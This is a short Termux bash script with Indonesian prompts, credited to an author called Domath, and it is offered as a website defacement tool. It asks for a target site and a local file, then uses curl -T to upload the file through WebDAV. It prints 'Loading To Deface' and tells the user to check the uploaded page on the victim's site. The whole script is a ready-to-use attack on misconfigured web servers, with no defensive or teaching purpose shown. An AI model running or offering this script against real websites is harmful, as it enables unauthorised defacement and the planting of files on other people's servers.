#!/data/data/com.termux/files/usr/bin/bash
#Coded : Domath 
#Author Hapus pun gak bikin lu pro
#Jangan Hapus Copyright
#Hargai Pembuat
clear
echo
echo -e  '\e[1;36m' "Author :"'\e[1;36m'" Domath"
echo -e '\e[1;36m' "Blog :"'\e[1;37m'" http://gilacoders.blogspot.com"
echo -e '\e[1;32m' "Note : Taruh Sc di Internal."                                                                                           
echo -e '\e[1;31m' "01]"'\e[1;37m'" Mulai Tebas"             
echo -e '\e[1;31m' "02]"'\e[1;37m'" Keluar"           
echo -e '\e[1;36m' ""                                       
read -p "Pilih => " dog;                                    
if [ $dog = 1 ] || [ $dog = 01 ]                            
then                                                        
figlet -f small "WEBDAV" |lolcat                 
echo -e '\e[1;37m' "Masukan Website Target"                 
echo -n "Website : "                                        
read website ;                                              
echo -e '\e[1;37m' " Masukan Nama Script"                   
echo -n "Script : "                                         
read script ;                                               
echo -e '\e[1;31m' "Loading To Deface"                      
curl -T /storage/emulated/0/$script $website               
echo -e '\e[1;37m' "Coba di Cek: $website/$script"          
fi
if [ $dog = 2 ] || [ $dog = 02  ]
then                                                        
echo -e '\e[1;31m'" Keluar"
sleep 1
echo -e '\e[1;31m'"Dadah mhanx "
exit
fi